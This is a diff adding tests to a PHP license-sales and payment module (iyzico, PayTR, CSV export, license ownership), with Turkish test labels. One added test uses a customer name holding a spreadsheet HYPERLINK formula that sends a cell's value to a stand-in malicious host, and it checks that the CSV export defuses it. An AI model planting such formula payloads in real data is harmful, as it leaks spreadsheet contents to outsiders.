@@ -108,8 +108,10 @@ $http->respond = function (string $url, array $h, $body) use ($order) {
     return [200, json_encode(['status' => 'success', 'token' => $token, 'conversationId' => $order['id'], 'paymentPageUrl' => 'https://sandbox-cpp.iyzipay.com?token=' . $token,
         'signature' => hash_hmac('sha256', $order['id'] . ':' . $token, 'SECRET')])];
 };
-$url = $iyz->initialize($order, $plan, 'https://site/geri', '11111111111');
-check(str_starts_with($url, 'https://sandbox-cpp.iyzipay.com'), 'iyzico ödeme sayfası adresi');
+$started = $iyz->initialize($order, $plan, 'https://site/geri', '11111111111');
+check(str_starts_with($started['url'], 'https://sandbox-cpp.iyzipay.com') && $started['token'] === 'tok-iyz', 'iyzico ödeme sayfası adresi ve token');
+$orders->setProviderToken($order['id'], $started['token']);
+check($orders->find($order['id'])['provider_token'] === 'tok-iyz', 'token siparişte saklandı (müşteri dönmezse sonradan sorulur)');
 [$callUrl, $headers, $body] = $http->calls[0];
 check($callUrl === 'https://sandbox-api.iyzipay.com/payment/iyzipos/checkoutform/initialize/auth/ecom', 'iyzico uç noktası');
 $decoded = base64_decode(substr($headers['Authorization'], strlen('IYZWSv2 ')));
@@ -134,7 +136,8 @@ try {
 $http->respond = fn () => $result('FAILURE', '4990.00', $order['id']);
 check($iyz->retrieve('tok-iyz')['paid'] === false, 'başarısız ödeme');
 $http->respond = fn () => $result('SUCCESS', '4990.00', $order['id'], 'SECRET', '0');
-check($iyz->retrieve('tok-iyz')['paid'] === false, 'fraud incelemesindeki ödeme lisans almaz');
+$review = $iyz->retrieve('tok-iyz');
+check($review['paid'] === false && $review['review'] === true, 'fraud incelemesindeki ödeme lisans almaz ama başarısız da sayılmaz');
 $http->respond = fn () => $result('SUCCESS', '4990.00', $order['id']);
 $res = $iyz->retrieve('tok-iyz');
 check($res['paid'] && $res['priceKurus'] === 499000 && $res['orderId'] === $order['id'], 'iyzico sonucu doğrulandı');
@@ -186,6 +189,34 @@ $revoke = json_encode(['saleId' => 'shop-1001']);
 check($st === 200 && $d['revoked'] === 1 && $issuer->license($a['licenseId'])['status'] === 'cancelled', 'dış iade');
 [$st] = $ext->handle('v1/sales', ExternalSales::sign($secret, $body, $now), $body);
 check($st === 409, 'iade edilmiş satış yeniden lisans üretmez');
+
+// ---------------- İnceleme bulguları (1.2.0)
+check(Plan::parsePrice('4.990,00') === 499000 && Plan::parsePrice('4990') === 499000 && Plan::parsePrice('4.990') === 499000 && Plan::parsePrice('49,90') === 4990, 'fiyat: Türkçe biçim');
+check(Plan::parsePrice('49.90') === 4990 && Plan::parsePrice('1499.9') === 149990, 'fiyat: nokta ondalık (eskiden 100 kat oluyordu)');
+check(Plan::parsePrice('1.5.0') === null && Plan::parsePrice('abc') === null && Plan::parsePrice('') === null, 'fiyat: belirsiz giriş reddedilir');
+
+$snapOrder = $orders->create($plan, 'paytr', $form, null, '81.2.3.4');
+$edited = ['yillik' => new Plan('yillik', 'Yıllık', 999900, 'new', 'Pro', 9, 30)];
+$frozen = Orders::planFor($snapOrder, $edited);
+check($frozen !== null && $frozen->devices === $plan->devices && $frozen->days === $plan->days && $frozen->edition === $plan->edition, 'sipariş, satın alındığı andaki paketi alır (sonradan değişen paket değil)');
+check(Orders::planFor($snapOrder, []) !== null, 'paket silinse de ödenen sipariş lisansını alır');
+
+$evil = $orders->create($plan, 'paytr', ['name' => '=HYPERLINK("https://kotu/?"&A2,"Detay") X'] + $form, null, '81.2.3.4');
+$orders->paid($evil['id'], 'paytr', 'paytr:' . $evil['id'], 499000, 'TRY', $plan);
+$csv = $orders->csv(0, PHP_INT_MAX, new DateTimeZone('Europe/Istanbul'));
+check(str_contains($csv, "\"'=HYPERLINK") && !str_contains($csv, ';"=HYPERLINK'), 'CSV formül olarak çalışmaz');
+check(str_contains($csv, '"05321234567"'), 'CSV telefon yerel biçimde (başında + yok)');
+$late = $orders->create($plan, 'paytr', $form, null, '81.2.3.4');
+$orders->paid($late['id'], 'paytr', 'paytr:' . $late['id'], 499000, 'TRY', $plan);
+$db->execute('UPDATE {orders} SET paid_at = ? WHERE id = ?', [gmmktime(22, 30, 0, 11, 30, 2026), $late['id']]);
+$december = (new DateTimeImmutable('2026-12-01 00:00:00', new DateTimeZone('Europe/Istanbul')))->getTimestamp();
+$dec = $orders->csv($december, $december + 31 * 86400, new DateTimeZone('Europe/Istanbul'));
+check(str_contains($dec, $late['id']) && str_contains($dec, '01.12.2026 01:30'), 'İstanbul saatiyle 1 Aralık 01:30 satışı Aralık CSV\'sinde');
+
+$owned = $issuer->createLicense('Hesap Sahibi', 'sahip@example.com', 77, 'Standart', 1, 365, 'manual');
+$issuer->createLicense('Misafir', 'misafir@example.com', null, 'Standart', 1, 365, 'manual');
+$mine = $issuer->licenses(null, 77);
+check(count($mine) === 1 && $mine[0]['customer_email'] === 'sahip@example.com', 'hesap yalnızca kendi lisanslarını görür (e-postayla eşleşme yok)');
 
 // ---------------- Lisanslarım bağlantısı
 $secretKey = 'gizli-anahtar-xxxxxxxxxxxxxxxxxxxxxxxx';
